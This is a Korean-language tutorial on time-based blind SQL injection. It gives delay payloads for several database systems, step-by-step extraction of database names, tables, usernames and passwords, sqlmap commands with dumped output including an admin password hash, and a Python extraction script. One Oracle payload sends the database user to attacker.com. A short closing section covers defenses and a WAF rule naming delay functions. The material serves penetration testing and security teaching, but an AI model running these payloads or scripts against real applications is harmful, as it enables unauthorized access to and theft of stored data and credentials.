Time-based Blind SQL Injection

Time-based Blind SQLi는 데이터베이스의 시간 지연 함수를 이용하여 쿼리의 참/거짓을 판단하고 데이터를 추출하는 가장 범용적인 Blind SQLi 기법입니다.

개념 (Concept)​

Time-based Blind SQLi란?​

Time-based Blind SQL Injection은 조건이 참일 때 의도적으로 시간 지연을 발생시켜, 응답 시간을 측정함으로써 데이터베이스 정보를 추론하는 기법입니다.

작동 원리:

참 조건 → 5초 지연 → 느린 응답
거짓 조건 → 지연 없음 → 빠른 응답

예시:

-- MySQL: 참이면 5초 지연
' AND IF(1=1, SLEEP(5), 0)--   (5초 후 응답)

-- MySQL: 거짓이면 즉시 응답
' AND IF(1=2, SLEEP(5), 0)--   (즉시 응답)

사용 시나리오​

Time-based는 다음과 같은 상황에서 유일한 선택지:

  • Boolean-based 응답 차이가 전혀 없을 때
  • 에러 메시지가 완전히 숨겨진 경우
  • 모든 입력에 동일한 응답을 반환할 때

장단점:

장점단점
가장 범용적 (항상 사용 가능)매우 느림 (각 시도마다 5~10초)
응답 차이 불필요네트워크 지연과 혼동 가능
WAF 우회에 유리로그에 명확히 기록됨

DBMS별 시간 지연 함수​

MySQL​

SLEEP 함수​

기본 구문:

SELECT SLEEP(초)

페이로드 예시:

# 단순 지연
' AND SLEEP(5)--

# 조건부 지연
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING(database(), 1, 1)='w', SLEEP(5), 0)--

# CASE 사용
' AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END--

BENCHMARK 함수​

CPU를 많이 사용하여 지연:

# 1억 번 MD5 연산
' AND BENCHMARK(100000000, MD5('test'))--

# 조건부
' AND IF(1=1, BENCHMARK(100000000, MD5('a')), 0)--

MSSQL (Microsoft SQL Server)​

WAITFOR DELAY​

기본 구문:

WAITFOR DELAY '시:분:초'

페이로드 예시:

# 단순 지연 (5초)
'; WAITFOR DELAY '00:00:05'--

# 조건부 지연
'; IF (1=1) WAITFOR DELAY '00:00:05'--
'; IF (SUBSTRING(DB_NAME(), 1, 1)='m') WAITFOR DELAY '00:00:05'--

# 중첩 쿼리
' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2 WHERE WAITFOR DELAY '00:00:05') END)--

WAITFOR TIME​

특정 시각까지 대기:

'; WAITFOR TIME '23:59:59'--

PostgreSQL​

pg_sleep 함수​

기본 구문:

SELECT pg_sleep(초)

페이로드 예시:

# 단순 지연
'; SELECT pg_sleep(5)--

# 조건부 지연
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
'; SELECT CASE WHEN (SUBSTRING(current_database(), 1, 1)='p') THEN pg_sleep(5) ELSE pg_sleep(0) END--

Oracle​

DBMS_LOCK.SLEEP​

기본 구문:

BEGIN DBMS_LOCK.SLEEP(초); END;

페이로드 예시:

# 단순 지연
' AND DBMS_LOCK.SLEEP(5)--

# 조건부 지연
' AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE NULL END FROM dual)--

UTL_HTTP 이용​

외부 연결 시도로 타임아웃:

' AND UTL_HTTP.REQUEST('http://attacker.com/?data='||(SELECT user FROM dual))='1'--

SQLite​

SQLite는 기본 시간 지연 함수가 없음

우회 방법 1: 복잡한 연산​

# 많은 계산으로 지연
' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 ... UNION SELECT 10000))>0--

우회 방법 2: 사용자 정의 함수​

애플리케이션 레벨에서 정의된 함수 이용:

' AND randomblob(100000000)--

수동 공격 (Manual Exploitation)​

단계 1: 시간 지연 취약점 확인​

기본 테스트 (MySQL)​

정상 요청 (지연 없음):

http://example.com/product?id=1

→ 즉시 응답 (< 1초)

SLEEP 주입 (5초 지연):

http://example.com/product?id=1' AND SLEEP(5)--

→ 5초 후 응답

결론: Time-based SQLi 취약점 존재

DBMS 식별​

각 DBMS별 페이로드 시도:

# MySQL
' AND SLEEP(5)--   (5초 지연 → MySQL)

# MSSQL
'; WAITFOR DELAY '00:00:05'--   (5초 지연 → MSSQL)

# PostgreSQL
'; SELECT pg_sleep(5)--   (5초 지연 → PostgreSQL)

단계 2: 데이터베이스 이름 길이 확인​

MySQL 예시:

# 길이가 1인가?
' AND IF(LENGTH(database())=1, SLEEP(5), 0)--   (즉시 응답 → 거짓)

# 길이가 6인가?
' AND IF(LENGTH(database())=6, SLEEP(5), 0)--   (5초 지연 → 참!)

→ DB 이름 길이: 6글자

MSSQL 예시:

'; IF (LEN(DB_NAME())=6) WAITFOR DELAY '00:00:05'--

PostgreSQL 예시:

'; SELECT CASE WHEN (LENGTH(current_database())=6) THEN pg_sleep(5) ELSE pg_sleep(0) END--

단계 3: 데이터베이스 이름 추출​

문자 단위 비교 (MySQL)​

1번째 글자:

' AND IF(SUBSTRING(database(), 1, 1)='a', SLEEP(5), 0)--   (즉시 응답)
' AND IF(SUBSTRING(database(), 1, 1)='b', SLEEP(5), 0)--   (즉시 응답)
...
' AND IF(SUBSTRING(database(), 1, 1)='w', SLEEP(5), 0)--   (5초 지연 → 참!)

2번째 글자:

' AND IF(SUBSTRING(database(), 2, 1)='a', SLEEP(5), 0)--   (5초 지연 → 참!)

반복 후 결과: webapp

이진 탐색 (효율적)​

MySQL - ASCII 범위 좁히기:

# 1번째 글자가 100보다 큰가?
' AND IF(ASCII(SUBSTRING(database(), 1, 1))>100, SLEEP(5), 0)--   (5초 지연 → 참)

# 118보다 큰가?
' AND IF(ASCII(SUBSTRING(database(), 1, 1))>118, SLEEP(5), 0)--   (즉시 응답 → 거짓)

# 109보다 큰가?
' AND IF(ASCII(SUBSTRING(database(), 1, 1))>109, SLEEP(5), 0)--   (5초 지연 → 참)

# (반복...)

# 정확한 값 확인
' AND IF(ASCII(SUBSTRING(database(), 1, 1))=119, SLEEP(5), 0)--   (5초 지연 → 참!)

→ ASCII 119 = 'w'

단계 4: 테이블 이름 추출​

테이블 개수 확인 (MySQL):

' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=5, SLEEP(5), 0)--

첫 번째 테이블 이름 추출:

' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 1, 1)='u', SLEEP(5), 0)--

단계 5: 데이터 추출​

사용자 이름 추출 (MySQL):

' AND IF(SUBSTRING((SELECT username FROM users LIMIT 0,1), 1, 1)='a', SLEEP(5), 0)--

비밀번호 추출:

' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)='5', SLEEP(5), 0)--

자동화 도구 (Automated Tools)​

SQLMap - Time-based 전용​

기본 스캔​

sqlmap -u "http://example.com/product?id=1" --technique=T --batch

출력 예시:

[INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[INFO] it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found

현재 DB 추출​

sqlmap -u "http://example.com/product?id=1" --technique=T --current-db

출력 예시:

[INFO] fetching current database
[INFO] retrieving the length of query output
[INFO] retrieved: 6
[INFO] retrieved: webapp
current database: 'webapp'

테이블 열거​

sqlmap -u "http://example.com/product?id=1" --technique=T -D webapp --tables

시간 예상:

  • 테이블 이름 5개 × 평균 8글자 × 5초 = 약 3~4분

데이터 덤프​

sqlmap -u "http://example.com/product?id=1" --technique=T -D webapp -T users --dump

주의: 대용량 데이터는 매우 오래 걸림

속도 향상 옵션​

# 지연 시간 단축 (3초)
sqlmap -u "URL" --technique=T --time-sec=3

# 스레드 수 증가 (10개)
sqlmap -u "URL" --technique=T --threads=10

# 특정 컬럼만 추출
sqlmap -u "URL" --technique=T -D webapp -T users -C username,password --dump

Python 스크립트 예시​

간단한 Time-based SQLi 자동화:

import requests
import time
import string

url = "http://example.com/product?id=1"
charset = string.ascii_lowercase + string.digits + '_'
delay_threshold = 4  # 4초 이상이면 참으로 판단

result = ""

print("[*] Extracting database name...")
for position in range(1, 20):
    for char in charset:
        payload = f"' AND IF(SUBSTRING(database(), {position}, 1)='{char}', SLEEP(5), 0)--"

        start_time = time.time()
        r = requests.get(url + payload, timeout=10)
        elapsed = time.time() - start_time

        if elapsed >= delay_threshold:
            result += char
            print(f"[+] Found character: {char}")
            break
    else:
        # 더 이상 문자 없음
        break

print(f"[+] Database name: {result}")

출력 예시:

[*] Extracting database name...
[+] Found character: w
[+] Found character: a
[+] Found character: b
[+] Found character: a
[+] Found character: p
[+] Found character: p
[+] Database name: webapp

고급 기법​

1. 스택 쿼리 (Stacked Queries)​

일부 DBMS는 여러 쿼리를 세미콜론으로 구분하여 실행 가능:

MSSQL:

'; IF (1=1) WAITFOR DELAY '00:00:05'; SELECT * FROM users--

PostgreSQL:

'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END; SELECT * FROM users--

2. Heavy Query (무거운 쿼리)​

시간 지연 함수가 차단된 경우:

MySQL:

# 거대한 UNION
' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)>0--

# GET_LOCK 이용
' AND GET_LOCK('lock', 5)--

MSSQL:

# 많은 조인
' AND (SELECT COUNT(*) FROM sys.columns A, sys.columns B)>0--

3. 조건부 중첩​

복잡한 조건문으로 WAF 우회:

' AND (SELECT CASE WHEN ((SELECT SUBSTRING(database(), 1, 1))='w') THEN (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) ELSE 0 END)--

실전 공격 시나리오​

시나리오: 로그인 폼 우회 + 관리자 비밀번호 추출​

대상: 로그인 폼 (POST 파라미터)

1. Burp Suite로 요청 캡처:

POST /login.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=test

2. Time-based 취약점 확인:

username=admin' AND SLEEP(5)-- &password=test

→ 5초 지연 (취약점 존재)

3. SQLMap으로 자동화:

요청 파일 저장 (request.txt):

POST /login.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=test

SQLMap 실행:

sqlmap -r request.txt --technique=T -p username --current-db

4. 관리자 비밀번호 추출:

sqlmap -r request.txt --technique=T -p username -D webapp -T users --dump --where="username='admin'"

출력:

[INFO] retrieved: 5f4dcc3b5aa765d61d8327deb882cf99
Database: webapp
Table: users
[1 entry]
+-------+----------+----------------------------------+
| id    | username | password                         |
+-------+----------+----------------------------------+
| 1     | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
+-------+----------+----------------------------------+

네트워크 지연과 구분하기​

문제점​

네트워크 지연과 SQL 지연을 혼동할 수 있음:

  • 네트워크 불안정: 응답 시간 불규칙
  • SQL SLEEP: 응답 시간 일정 (정확히 5초)

해결 방법​

1. 여러 번 테스트​

delay_times = []
for i in range(5):
    start = time.time()
    r = requests.get(url + payload)
    elapsed = time.time() - start
    delay_times.append(elapsed)

average_delay = sum(delay_times) / len(delay_times)
if average_delay >= 4.5:  # 5초 지연 의도
    # 참 조건

2. 기준선(Baseline) 측정​

# 정상 요청 응답 시간 측정
normal_times = []
for i in range(10):
    start = time.time()
    r = requests.get(url)
    normal_times.append(time.time() - start)

baseline = sum(normal_times) / len(normal_times)
threshold = baseline + 4  # 기준선 + 4초

3. 상대적 비교​

거짓 조건과 참 조건의 응답 시간 차이:

# 거짓 조건
start = time.time()
r1 = requests.get(url + "' AND IF(1=2, SLEEP(5), 0)--")
time_false = time.time() - start

# 참 조건
start = time.time()
r2 = requests.get(url + "' AND IF(1=1, SLEEP(5), 0)--")
time_true = time.time() - start

if (time_true - time_false) >= 4:
    # 명확한 차이 → Time-based SQLi 확인

최적화 및 속도 향상​

1. 지연 시간 최소화​

# 3초로 단축 (기본 5초)
sqlmap -u "URL" --technique=T --time-sec=3

주의: 너무 짧으면 네트워크 지연과 구분 어려움

2. 병렬 처리​

import concurrent.futures

def test_char(position, char):
    # 각 문자 테스트
    return is_match

with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
    futures = [executor.submit(test_char, pos, c) for c in charset]

3. 이진 탐색​

알파벳 26번 → 5번으로 단축:

def binary_search_char(position):
    low, high = ord('a'), ord('z')

    while low <= high:
        mid = (low + high) // 2
        payload = f"' AND IF(ASCII(SUBSTRING(database(), {position}, 1))>{mid}, SLEEP(5), 0)--"

        start = time.time()
        r = requests.get(url + payload)
        elapsed = time.time() - start

        if elapsed >= 4:
            low = mid + 1  # 더 큰 값
        else:
            high = mid - 1  # 더 작은 값

    return chr(low)

방어 기법​

1. Prepared Statements​

PHP:

$stmt = $pdo->prepare("SELECT * FROM products WHERE id = ?");
$stmt->execute([$_GET['id']]);

2. 시간 제한 설정​

MySQL:

SET SESSION max_execution_time = 1000;  -- 1초 제한

PHP:

set_time_limit(2);  // 최대 2초

3. 쿼리 타임아웃​

PHP (PDO):

$pdo->setAttribute(PDO::ATTR_TIMEOUT, 2);

4. Rate Limiting​

연속적인 느린 요청 차단:

if ($request_count > 10 && $avg_response_time > 3) {
    // Time-based SQLi 의심
    ban_ip($_SERVER['REMOTE_ADDR']);
}

5. WAF 룰​

ModSecurity:

SecRule ARGS "@rx (SLEEP|WAITFOR|pg_sleep|DBMS_LOCK)" \
    "id:1004,phase:2,deny,status:403,msg:'Time-based SQLi attempt'"

트러블슈팅 체크리스트​

지연이 발생하지 않을 때​

  • DBMS 종류 재확인 (MySQL, MSSQL, PostgreSQL 등)
  • 시간 지연 함수가 차단되는지 확인
  • Heavy Query로 대체 시도
  • Stacked Queries 가능 여부 확인

응답 시간이 불규칙할 때​

  • 여러 번 테스트하여 평균값 사용
  • 네트워크 상태 확인
  • 지연 시간 증가 (5초 → 10초)
  • 기준선(Baseline) 측정

추출 속도가 너무 느릴 때​

  • 이진 탐색 알고리즘 사용
  • 지연 시간 단축 (3초)
  • 병렬 요청 (멀티스레딩)
  • SQLMap 자동화 도구 사용
  • 추출 데이터 최소화 (필요한 컬럼만)

# POST 파라미터
sqlmap -r request.txt --technique=T -p parameter_name
